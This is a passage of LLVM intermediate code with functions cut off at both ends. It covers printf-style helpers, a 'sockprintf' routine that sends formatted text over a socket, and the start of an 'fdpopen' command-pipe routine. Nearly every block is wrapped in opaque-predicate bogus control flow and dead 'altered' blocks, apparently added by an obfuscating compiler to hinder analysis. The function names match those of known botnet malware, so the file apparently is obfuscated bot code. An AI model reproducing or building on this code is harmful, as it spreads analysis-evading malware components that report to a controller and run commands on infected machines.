  br label %49

; <label>:75:                                     ; preds = %49
  %76 = load i32, i32* @x.13
  %77 = load i32, i32* @y.14
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %75
  %84 = load i32, i32* %19, align 4
  %85 = load i32, i32* %15, align 4
  %86 = icmp sge i32 %84, %85
  %87 = load i32, i32* @x.13
  %88 = load i32, i32* @y.14
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %86, label %95, label %112

; <label>:95:                                     ; preds = %originalBBpart212
  %96 = load i32, i32* @x.13
  %97 = load i32, i32* @y.14
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %95
  store i32 0, i32* %15, align 4
  %104 = load i32, i32* @x.13
  %105 = load i32, i32* @y.14
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %116

; <label>:112:                                    ; preds = %originalBBpart212
  %113 = load i32, i32* %19, align 4
  %114 = load i32, i32* %15, align 4
  %115 = sub nsw i32 %114, %113
  store i32 %115, i32* %15, align 4
  br label %116

; <label>:116:                                    ; preds = %112, %originalBBpart216
  %117 = load i32, i32* %16, align 4
  %118 = and i32 %117, 2
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %120, label %121

; <label>:120:                                    ; preds = %116
  store i32 48, i32* %18, align 4
  br label %121

; <label>:121:                                    ; preds = %120, %116
  %122 = load i32, i32* @x.13
  %123 = load i32, i32* @y.14
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %121
  %130 = load i32, i32* @x.13
  %131 = load i32, i32* @y.14
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %138

; <label>:138:                                    ; preds = %originalBBpart220, %originalBBpart2
  %139 = load i32, i32* %16, align 4
  %140 = and i32 %139, 1
  %141 = icmp ne i32 %140, 0
  br i1 %141, label %187, label %142

; <label>:142:                                    ; preds = %138
  %143 = load i32, i32* @x.13
  %144 = load i32, i32* @y.14
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %142
  %151 = load i32, i32* @x.13
  %152 = load i32, i32* @y.14
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %159

; <label>:159:                                    ; preds = %183, %originalBBpart224
  %160 = load i32, i32* @x.13
  %161 = load i32, i32* @y.14
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %159
  %168 = load i32, i32* %15, align 4
  %169 = icmp sgt i32 %168, 0
  %170 = load i32, i32* @x.13
  %171 = load i32, i32* @y.14
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %169, label %178, label %186

; <label>:178:                                    ; preds = %originalBBpart228
  %179 = load i8**, i8*** %13, align 8
  %180 = load i32, i32* %18, align 4
  call void @printchar(i8** %179, i32 %180)
  %181 = load i32, i32* %17, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %17, align 4
  br label %183

; <label>:183:                                    ; preds = %178
  %184 = load i32, i32* %15, align 4
  %185 = add nsw i32 %184, -1
  store i32 %185, i32* %15, align 4
  br label %159

; <label>:186:                                    ; preds = %originalBBpart228
  br label %187

; <label>:187:                                    ; preds = %186, %138
  %188 = load i32, i32* @x.13
  %189 = load i32, i32* @y.14
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %187
  %196 = load i32, i32* @x.13
  %197 = load i32, i32* @y.14
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %204

; <label>:204:                                    ; preds = %215, %originalBBpart232
  %205 = load i8*, i8** %14, align 8
  %206 = load i8, i8* %205, align 1
  %207 = icmp ne i8 %206, 0
  br i1 %207, label %208, label %218

; <label>:208:                                    ; preds = %204
  %209 = load i8**, i8*** %13, align 8
  %210 = load i8*, i8** %14, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  call void @printchar(i8** %209, i32 %212)
  %213 = load i32, i32* %17, align 4
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %17, align 4
  br label %215

; <label>:215:                                    ; preds = %208
  %216 = load i8*, i8** %14, align 8
  %217 = getelementptr inbounds i8, i8* %216, i32 1
  store i8* %217, i8** %14, align 8
  br label %204

; <label>:218:                                    ; preds = %204
  br label %219

; <label>:219:                                    ; preds = %227, %218
  %220 = load i32, i32* %15, align 4
  %221 = icmp sgt i32 %220, 0
  br i1 %221, label %222, label %230

; <label>:222:                                    ; preds = %219
  %223 = load i8**, i8*** %13, align 8
  %224 = load i32, i32* %18, align 4
  call void @printchar(i8** %223, i32 %224)
  %225 = load i32, i32* %17, align 4
  %226 = add nsw i32 %225, 1
  store i32 %226, i32* %17, align 4
  br label %227

; <label>:227:                                    ; preds = %222
  %228 = load i32, i32* %15, align 4
  %229 = add nsw i32 %228, -1
  store i32 %229, i32* %15, align 4
  br label %219

; <label>:230:                                    ; preds = %219
  %231 = load i32, i32* %17, align 4
  ret i32 %231

originalBBalteredBB:                              ; preds = %originalBB, %4
  %232 = alloca i8**, align 8
  %233 = alloca i8*, align 8
  %234 = alloca i32, align 4
  %235 = alloca i32, align 4
  %236 = alloca i32, align 4
  %237 = alloca i32, align 4
  %238 = alloca i32, align 4
  %239 = alloca i8*, align 8
  store i8** %0, i8*** %232, align 8
  store i8* %1, i8** %233, align 8
  store i32 %2, i32* %234, align 4
  store i32 %3, i32* %235, align 4
  store i32 0, i32* %236, align 4
  store i32 32, i32* %237, align 4
  %240 = load i32, i32* %234, align 4
  %241 = icmp sgt i32 %240, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  store i32 0, i32* %19, align 4
  %242 = load i8*, i8** %14, align 8
  store i8* %242, i8** %20, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %56
  %243 = load i8*, i8** %20, align 8
  %244 = getelementptr inbounds i8, i8* %243, i32 1
  store i8* %244, i8** %20, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %75
  %245 = load i32, i32* %19, align 4
  %246 = load i32, i32* %15, align 4
  %247 = icmp sge i32 %245, %246
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %95
  store i32 0, i32* %15, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %121
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %142
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %159
  %248 = load i32, i32* %15, align 4
  %249 = icmp sgt i32 %248, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %187
  br label %originalBB30
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %198

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart222, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %106

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* @x.15
  %55 = load i32, i32* @y.16
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %53
  %62 = load i32, i32* %21, align 4
  %63 = load i32, i32* %11, align 4
  %64 = urem i32 %62, %63
  store i32 %64, i32* %18, align 4
  %65 = load i32, i32* %18, align 4
  %66 = icmp sge i32 %65, 10
  %67 = load i32, i32* @x.15
  %68 = load i32, i32* @y.16
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %66, label %75, label %81

; <label>:75:                                     ; preds = %originalBBpart2
  %76 = load i32, i32* %15, align 4
  %77 = sub nsw i32 %76, 48
  %78 = sub nsw i32 %77, 10
  %79 = load i32, i32* %18, align 4
  %80 = add nsw i32 %79, %78
  store i32 %80, i32* %18, align 4
  br label %81

; <label>:81:                                     ; preds = %75, %originalBBpart2
  %82 = load i32, i32* @x.15
  %83 = load i32, i32* @y.16
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB5, label %originalBB5alteredBB

originalBB5:                                      ; preds = %originalBB5alteredBB, %81
  %90 = load i32, i32* %18, align 4
  %91 = add nsw i32 %90, 48
  %92 = trunc i32 %91 to i8
  %93 = load i8*, i8** %17, align 8
  %94 = getelementptr inbounds i8, i8* %93, i32 -1
  store i8* %94, i8** %17, align 8
  store i8 %92, i8* %94, align 1
  %95 = load i32, i32* %11, align 4
  %96 = load i32, i32* %21, align 4
  %97 = udiv i32 %96, %95
  store i32 %97, i32* %21, align 4
  %98 = load i32, i32* @x.15
  %99 = load i32, i32* @y.16
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart222, label %originalBB5alteredBB

originalBBpart222:                                ; preds = %originalBB5
  br label %50

; <label>:106:                                    ; preds = %50
  %107 = load i32, i32* @x.15
  %108 = load i32, i32* @y.16
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %106
  %115 = load i32, i32* %19, align 4
  %116 = icmp ne i32 %115, 0
  %117 = load i32, i32* @x.15
  %118 = load i32, i32* @y.16
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br i1 %116, label %125, label %174

; <label>:125:                                    ; preds = %originalBBpart226
  %126 = load i32, i32* @x.15
  %127 = load i32, i32* @y.16
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %125
  %134 = load i32, i32* %13, align 4
  %135 = icmp ne i32 %134, 0
  %136 = load i32, i32* @x.15
  %137 = load i32, i32* @y.16
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br i1 %135, label %144, label %170

; <label>:144:                                    ; preds = %originalBBpart230
  %145 = load i32, i32* %14, align 4
  %146 = and i32 %145, 2
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %148, label %170

; <label>:148:                                    ; preds = %144
  %149 = load i32, i32* @x.15
  %150 = load i32, i32* @y.16
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %148
  %157 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %157, i32 45)
  %158 = load i32, i32* %20, align 4
  %159 = add nsw i32 %158, 1
  store i32 %159, i32* %20, align 4
  %160 = load i32, i32* %13, align 4
  %161 = add nsw i32 %160, -1
  store i32 %161, i32* %13, align 4
  %162 = load i32, i32* @x.15
  %163 = load i32, i32* @y.16
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart239, label %originalBB32alteredBB

originalBBpart239:                                ; preds = %originalBB32
  br label %173

; <label>:170:                                    ; preds = %144, %originalBBpart230
  %171 = load i8*, i8** %17, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 -1
  store i8* %172, i8** %17, align 8
  store i8 45, i8* %172, align 1
  br label %173

; <label>:173:                                    ; preds = %170, %originalBBpart239
  br label %174

; <label>:174:                                    ; preds = %173, %originalBBpart226
  %175 = load i32, i32* @x.15
  %176 = load i32, i32* @y.16
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %174
  %183 = load i32, i32* %20, align 4
  %184 = load i8**, i8*** %9, align 8
  %185 = load i8*, i8** %17, align 8
  %186 = load i32, i32* %13, align 4
  %187 = load i32, i32* %14, align 4
  %188 = call i32 @prints(i8** %184, i8* %185, i32 %186, i32 %187)
  %189 = add nsw i32 %183, %188
  store i32 %189, i32* %8, align 4
  %190 = load i32, i32* @x.15
  %191 = load i32, i32* @y.16
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart249, label %originalBB41alteredBB

originalBBpart249:                                ; preds = %originalBB41
  br label %198

; <label>:198:                                    ; preds = %originalBBpart249, %25
  %199 = load i32, i32* %8, align 4
  ret i32 %199

originalBBalteredBB:                              ; preds = %originalBB, %53
  %200 = load i32, i32* %21, align 4
  %201 = load i32, i32* %11, align 4
  %_ = sub i32 0, %200
  %gen = add i32 %_, %201
  %_1 = shl i32 %200, %201
  %_2 = shl i32 %200, %201
  %_3 = shl i32 %200, %201
  %_4 = shl i32 %200, %201
  %202 = urem i32 %200, %201
  store i32 %202, i32* %18, align 4
  %203 = load i32, i32* %18, align 4
  %204 = icmp sge i32 %203, 10
  br label %originalBB

originalBB5alteredBB:                             ; preds = %originalBB5, %81
  %205 = load i32, i32* %18, align 4
  %_6 = shl i32 %205, 48
  %_7 = shl i32 %205, 48
  %_8 = shl i32 %205, 48
  %_9 = sub i32 0, %205
  %gen10 = add i32 %_9, 48
  %_11 = sub i32 0, %205
  %gen12 = add i32 %_11, 48
  %_13 = sub i32 %205, 48
  %gen14 = mul i32 %_13, 48
  %206 = add nsw i32 %205, 48
  %207 = trunc i32 %206 to i8
  %208 = load i8*, i8** %17, align 8
  %209 = getelementptr inbounds i8, i8* %208, i32 -1
  store i8* %209, i8** %17, align 8
  store i8 %207, i8* %209, align 1
  %210 = load i32, i32* %11, align 4
  %211 = load i32, i32* %21, align 4
  %_15 = sub i32 %211, %210
  %gen16 = mul i32 %_15, %210
  %_17 = shl i32 %211, %210
  %_18 = sub i32 %211, %210
  %gen19 = mul i32 %_18, %210
  %_20 = shl i32 %211, %210
  %212 = udiv i32 %211, %210
  store i32 %212, i32* %21, align 4
  br label %originalBB5

originalBB24alteredBB:                            ; preds = %originalBB24, %106
  %213 = load i32, i32* %19, align 4
  %214 = icmp ne i32 %213, 0
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %125
  %215 = load i32, i32* %13, align 4
  %216 = icmp ne i32 %215, 0
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %148
  %217 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %217, i32 45)
  %218 = load i32, i32* %20, align 4
  %_33 = sub i32 %218, 1
  %gen34 = mul i32 %_33, 1
  %_35 = sub i32 %218, 1
  %gen36 = mul i32 %_35, 1
  %219 = add nsw i32 %218, 1
  store i32 %219, i32* %20, align 4
  %220 = load i32, i32* %13, align 4
  %_37 = shl i32 %220, -1
  %221 = add nsw i32 %220, -1
  store i32 %221, i32* %13, align 4
  br label %originalBB32

originalBB41alteredBB:                            ; preds = %originalBB41, %174
  %222 = load i32, i32* %20, align 4
  %223 = load i8**, i8*** %9, align 8
  %224 = load i8*, i8** %17, align 8
  %225 = load i32, i32* %13, align 4
  %226 = load i32, i32* %14, align 4
  %227 = call i32 @prints(i8** %223, i8* %224, i32 %225, i32 %226)
  %_42 = shl i32 %222, %227
  %_43 = shl i32 %222, %227
  %_44 = sub i32 0, %222
  %gen45 = add i32 %_44, %227
  %_46 = sub i32 0, %222
  %gen47 = add i32 %_46, %227
  %228 = add nsw i32 %222, %227
  store i32 %228, i32* %8, align 4
  br label %originalBB41
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #4

declare i64 @write(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #4
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #4
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

declare i64 @send(i32, i8*, i64, i32) #5

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %42

; <label>:25:                                     ; preds = %19, %14
  %26 = load i32, i32* @x.23
  %27 = load i32, i32* @y.24
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %25
  store i32 -1, i32* %3, align 4
  %34 = load i32, i32* @x.23
  %35 = load i32, i32* @y.24
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %237

; <label>:42:                                     ; preds = %19
  %43 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %44 = call i32 @pipe(i32* %43) #4
  %45 = icmp slt i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %42
  store i32 -1, i32* %3, align 4
  br label %237

; <label>:47:                                     ; preds = %42
  %48 = load i32*, i32** @fdopen_pids, align 8
  %49 = icmp eq i32* %48, null
  br i1 %49, label %50, label %102

; <label>:50:                                     ; preds = %47
  %51 = load i32, i32* @x.23
  %52 = load i32, i32* @y.24
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = call i32 @getdtablesize() #4
  store i32 %59, i32* %8, align 4
  %60 = icmp sle i32 %59, 0
  %61 = load i32, i32* @x.23
  %62 = load i32, i32* @y.24
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
